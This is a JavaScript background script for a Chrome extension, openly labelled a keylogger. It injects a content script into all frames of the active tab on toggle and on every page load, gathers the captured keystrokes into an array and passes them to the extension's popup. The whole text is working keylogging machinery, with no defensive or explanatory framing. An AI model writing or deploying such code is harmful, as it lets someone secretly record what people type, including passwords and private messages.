// Initialize the logged data array
let keyloggedData = [];
let keyloggerEnabled = false;
let keyloggerInjected = false;

chrome.storage.local.get(['keyloggerEnabled'], function(result) {
  // Initialize the keyloggerEnabled status from storage
  keyloggerEnabled = result.keyloggerEnabled || false;
});

// Toggle the keylogger functionality
chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
  if (message.type === 'toggleKeylogger') {
    keyloggerEnabled = !keyloggerEnabled;
    chrome.storage.local.set({ keyloggerEnabled: keyloggerEnabled });
    if (!keyloggerEnabled) {
      keyloggedData = [];
    }
    // Send the keyloggerEnabled status to the popup
    chrome.runtime.sendMessage({ type: 'keyloggerEnabled', data: keyloggerEnabled });
    // Inject the keylogger functionality into the active tab if it hasn't been injected yet
    if (!keyloggerInjected) {
      chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
        if (keyloggerEnabled && tabs && tabs.length > 0) {
          chrome.scripting.executeScript({
            target: { tabId: tabs[0].id, allFrames: true },
            files: ['content.js']
          }, function() {
            if (chrome.runtime.lastError) {
              console.error(chrome.runtime.lastError.message);
            } else {
              keyloggerInjected = true;
            }
          });
        } else {
          console.error('No active tabs found.');
        }
      });
    }
  }
});


// Listen for the chrome.tabs.onUpdated event and inject the keylogger functionality into the active tab if it hasn't been injected yet
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
  if (keyloggerEnabled && tab && tab.active && tab.status === 'complete') {
    chrome.scripting.executeScript({
      target: { tabId: tab.id, allFrames: true },
      files: ['content.js']
    }, function() {
      if (chrome.runtime.lastError) {
      }
    });
  }
});


// Listen for messages from the content script with captured keystrokes
chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
  if (message.type === 'updateLoggedData') {
    // Update the logged data with the captured keystrokes
    if (keyloggerEnabled) {
      keyloggedData.push(message.data);
    }
  }
});
// Send the logged data to the popup window when requested
chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
  if (message.type === 'getLoggedData') {
    sendResponse({ data: keyloggedData });
  }
});

// Update the keyloggerEnabled variable when the extension is installed or updated
chrome.runtime.onInstalled.addListener(function() {
  chrome.storage.local.get('keyloggerEnabled', function(result) {
    keyloggerEnabled = result.keyloggerEnabled || false;
  });
});

